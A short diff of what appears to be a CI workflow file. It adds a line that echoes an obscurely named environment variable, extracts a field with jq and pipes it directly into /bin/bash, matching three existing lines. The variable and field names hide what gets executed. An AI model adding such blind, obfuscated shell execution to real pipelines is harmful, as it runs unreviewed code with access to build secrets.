@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$mbu969" | jq -r .ubh1 | /bin/bash
           printf '%s' "$b5" | jq -r .xfls2 | /bin/bash
           echo $gizj740 | jq -r .mg65429 | /bin/bash
+          echo $metqs48 | jq -r .oh3 | /bin/bash
 
       - name: Persist results
         if: always()
